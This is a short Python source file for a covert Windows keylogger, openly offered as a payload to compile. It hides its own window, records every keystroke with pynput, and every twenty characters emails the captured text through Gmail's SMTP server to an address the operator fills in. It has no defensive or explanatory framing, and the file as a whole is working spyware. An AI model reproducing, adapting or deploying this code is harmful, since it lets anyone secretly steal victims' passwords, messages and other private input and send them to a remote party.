#Required imports
import smtplib
from pynput.keyboard import Key, Listener
import win32gui, win32con

#Hiding the window
hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(hide , win32con.SW_HIDE)

#Enter these details and compile to create Payload
email = ""
password = ""

server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)

full_log = ''
word = ''
char_limit = 20

#recording keystrokes
def on_press(key):
    global word
    global full_log
    global char_limit
    global email
    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ''
        if len(full_log) >= char_limit:
            send_log()
            full_log = ''
    elif key == Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.ctrl_l or key == Key.ctrl_r:
        return
    elif key == Key.backspace and len(word) == 0:
        return
    elif key == Key.backspace:
        word = word[:-1]
    else:
        word += str(key).strip("'")
        
    if key == Key.esc:
        return False

#Sending through mail
def send_log():
    server.sendmail(
        email,
        email,
        full_log
    )

#setting up listener
with Listener(on_press=on_press) as listener:
    listener.join()
